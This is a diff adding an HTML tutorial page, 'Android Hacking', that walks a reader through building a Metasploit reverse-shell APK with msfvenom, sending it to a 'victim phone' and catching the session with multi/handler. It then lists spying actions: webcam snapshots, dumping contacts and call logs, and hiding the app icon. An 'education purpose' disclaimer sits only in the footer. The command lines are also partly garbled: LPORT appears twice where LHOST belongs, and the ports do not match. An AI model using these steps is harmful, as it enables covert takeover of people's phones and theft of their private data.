@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Android Hacking</title>
+  <link href="img/icon.png" rel="icon">
+  <meta content="" name="descriptison">
+  <meta content="" name="keywords">
+
+ 
+
+ 
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+
+
+<body>
+
+  <!-- =======  Android ======= -->
+  <section id="Android" class="Android">
+    <div class="container">
+
+      <div class="section-title">
+        <h2>Android Hacking</h2>
+      </div>
+
+      <div class="row">
+        <div class="col-lg-6">
+          <h3 class="Android-title">What We Need?</h3>
+          <div class="Android-item pb-0">
+            <h4>1. Kali Linux Or Other</h4> 
+            <h4 Android-item pb-0>2. Basic Knowledge About Linux</h4>
+
+            <p><em>Metasploit is the framework where all type of pentesting tool is present.
+                You can hack anything like window pc, server, android, etc.</em></p>
+            <p>
+            <ul>
+              <li>Create A Payload And Send To The Victim Phone.</li>
+              <span style="color: red;">🔹 Command To Create Payload🔹</span>
+              <li>First Open Terminal</li>
+              <span style="color: red">🔹msfvenom -p android/meterpreter/reverse_tcp  LPORT=Your Local IP  LPORT=4444 -o App-name.apk.</span><br/>
+              <span>🔹After Created Apk. Open New Terminal And Type <span style="color: red;">Msfconsole.</span></span><br/>
+              <span style="color: red;">🔹use exploit/multi/handler</span><br/>
+              <span style="color: red;">🔹set payload android/meterpreter/reverse_tcp</span><br/>
+              <span style="color: red;">🔹set LHOST Your ip address</span><br/>
+              <span style="color: red;">🔹set LPORT 443</span><br/>
+              <span style="color: red;">🔹exploit</span>
+            </ul>
+            </p>
+          </div>
+        </div>
+        <div class="col-lg-6">
+          <h3 class="Android-title">Your System Is Ready To Hack Android Phone</h3>
+          <div class="Android-item">
+            <h4>When Victim Open Your App You Got Meterpreter Session.</h4>
+            <h4>It Mean's You Hacked Victim Phone.</h4>
+            <p><em>Type <span style="color: red;">help</span> Command For More.</em></p>
+            <p>
+            <ul>
+              <li>What You Can Do After Got Session :-</li>
+              <li style="color: red;">Webcam_Snap</li>
+              <li style="color:red;">Dump Contact</li>
+              <li style="color: red;">Dump_Call-Log</li>
+              <li style="color: red;">Hide_App_Icon</li>
+              <li style="color: red;">And More.</li>
+            </ul>
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+    </section><!-- End Android -->
+    <footer style="text-align: center;color: red;text-shadow: 3px 3px 5px black;font-weight: bold;">
+  <spa>"That's It"<br>
+This Is Only For Education Purpose...!!</span>
+</footer>
+
+</body>
+
+</html>
